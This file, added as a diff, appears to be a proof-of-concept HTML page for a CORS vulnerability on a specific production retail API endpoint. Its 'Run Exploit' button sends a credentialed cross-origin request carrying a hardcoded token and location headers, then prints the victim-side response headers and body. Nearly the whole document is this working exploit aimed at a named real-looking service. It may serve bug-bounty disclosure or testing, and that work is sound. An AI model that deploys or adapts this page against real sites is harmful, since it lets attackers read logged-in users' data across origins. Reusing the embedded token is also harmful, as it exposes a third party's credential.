@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CORS PoC – Page Components Endpoint</title>
+  <style>
+    body {
+      font-family: monospace;
+      background-color: #fefefe;
+      padding: 2rem;
+      color: #111;
+    }
+    h1 {
+      font-size: 20px;
+    }
+    button {
+      font-size: 16px;
+      padding: 0.5rem 1rem;
+      margin-bottom: 1rem;
+      cursor: pointer;
+    }
+    pre {
+      background: #f4f4f4;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      padding: 1rem;
+      white-space: pre-wrap;
+    }
+  </style>
+</head>
+<body>
+  <h1>CORS PoC: <code>/v1/frame/page-components</code></h1>
+  <button onclick="exploit()">Run Exploit</button>
+  <pre id="output">Click the button to run the exploit.</pre>
+
+  <script>
+    async function exploit() {
+      const output = document.getElementById("output");
+      output.textContent = "Sending exploit request...\n\n";
+
+      const url = "https://api-prod.retailsso.com/v1/frame/page-components?ids=56794";
+
+      const headers = {
+        "Appid": "Reactweb",
+        "Token": "43637022-547D-64D6-8CBE-88457DCDC69F",
+        "Lang": "en",
+        "Env": "prod",
+        "Longitude": "55.3613635",
+        "Latitude": "25.2171003",
+        "Storeid": "mafuae",
+        "Posinfo": "express=003_Zone01,QELEC=003_Zone01,food=072_Zone01,nonfood=099_Zone01"
+      };
+
+      try {
+        const res = await fetch(url, {
+          method: "GET",
+          mode: "cors",
+          credentials: "include", // Include cookies (if browser allows)
+          headers: headers
+        });
+
+        const responseText = await res.text();
+
+        let headerText = "";
+        res.headers.forEach((value, key) => {
+          headerText += `${key}: ${value}\n`;
+        });
+
+        output.textContent =
+`Request:
+GET ${url}
+
+Request Headers:
+${Object.entries(headers).map(([k, v]) => `${k}: ${v}`).join("\n")}
+
+------------------------
+
+Response Status: ${res.status} ${res.statusText}
+
+Response Headers:
+${headerText}
+
+Response Body:
+${responseText}`;
+      } catch (err) {
+        output.textContent += `\n\n⚠️ Error: ${err.message}`;
+      }
+    }
+  </script>
+</body>
+</html>
